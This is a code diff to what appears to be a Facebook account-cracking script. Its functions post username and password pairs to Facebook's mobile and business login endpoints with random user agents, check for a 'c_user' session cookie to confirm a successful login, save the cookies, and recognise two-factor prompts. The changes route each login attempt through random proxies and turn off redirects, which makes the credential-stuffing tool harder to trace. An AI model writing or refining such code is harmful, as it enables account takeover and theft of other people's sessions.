@@ -2139,7 +2139,7 @@ def freeq(uid,pwx,tl):
             ua = random.choice(uas)
             pro = random.choice(SUMONua)
             nip=random.choice(xvx)
-            proxs= {'http':nip}
+            proxs= {'http': nip}
             Session = requests.Session()
             free_fb = Session.get('https://m.facebook.com/').text
             data = {
@@ -2185,7 +2185,7 @@ def freeq(uid,pwx,tl):
             'Cache-Control': 'no-cache',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028"
-            po = Session.post(url, data=data, headers=headers).text
+            po = Session.post(url, data=data, headers=headers, allow_redirects=False, proxies=proxs).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
@@ -2295,7 +2295,7 @@ def d(uid,pwx,tl):
             'accept-language': 'en-US,en;q=0.9',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = "https://business.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028"
-            po = Session.post(url, data=data, headers=headers).text
+            po = Session.post(url, data=data, headers=headers, allow_redirects=False, proxies=proxs).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
